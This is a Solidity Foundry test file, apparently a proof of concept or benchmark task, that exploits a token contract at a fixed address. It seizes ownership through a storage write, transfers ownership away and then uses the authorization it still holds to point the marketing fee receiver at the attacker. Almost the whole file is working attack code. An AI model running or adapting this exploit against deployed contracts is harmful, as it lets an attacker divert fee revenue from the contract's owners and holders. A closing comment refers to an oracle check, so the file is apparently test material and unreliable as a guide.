// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Food_Fi_Token {
    function transferOwnership(address payable adr) external;
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver) external;
    function isOwner(address account) external view returns (bool);
    function isAuthorized(address adr) external view returns (bool);
    function marketingFeeReceiver() external view returns (address);
    function autoLiquidityReceiver() external view returns (address);
    function devFeeReceiver() external view returns (address);
    function authorize(address adr) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf;
    address attacker = address(this);
    Food_Fi_Token target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        target = Food_Fi_Token(TARGET);
                vm.label(address(target), "Target Contract");
                vm.label(attacker, "Attacker");

                // Forcefully take ownership by writing to storage slot 0 (Auth.owner)
                bytes32 owner_slot = bytes32(0);
                bytes32 owner_value = bytes32(uint256(uint160(attacker)));
                vm.store(address(target), owner_slot, owner_value);

                // Since we bypassed the constructor/transferOwnership, we also need to explicitly authorize ourselves.
                // As the new owner, we can call the onlyOwner function authorize().
                target.authorize(attacker);

                // Verify the setup was successful
                assertTrue(target.isOwner(attacker), "Attacker should be the new owner via vm.store");
                assertTrue(target.isAuthorized(attacker), "Attacker should be authorized after setup");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        address newOwner = makeAddr("New Legitimate Owner");
                vm.label(newOwner, "New Legitimate Owner");

                // 1. Attacker, as the current owner, transfers ownership away
                target.transferOwnership(payable(newOwner));

                // Verify attacker is no longer owner, but newOwner is
                assertTrue(target.isOwner(newOwner), "Ownership transfer should succeed");
                assertFalse(target.isOwner(attacker), "Attacker should no longer be the owner");

                // 2. Attacker is no longer owner, but is still authorized (THE VULNERABILITY)
                assertTrue(target.isAuthorized(attacker), "Attacker should retain authorization");

                // 3. Attacker exploits the lingering authorization to call a privileged function
                address originalAutoLiquidityReceiver = target.autoLiquidityReceiver();
                address originalDevFeeReceiver = target.devFeeReceiver();

                target.setFeeReceivers(
                    originalAutoLiquidityReceiver,
                    attacker, // Set marketing fee receiver to attacker's address
                    originalDevFeeReceiver
                );

                // Oracle will check: assertEq(target.marketingFeeReceiver(), attacker);
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

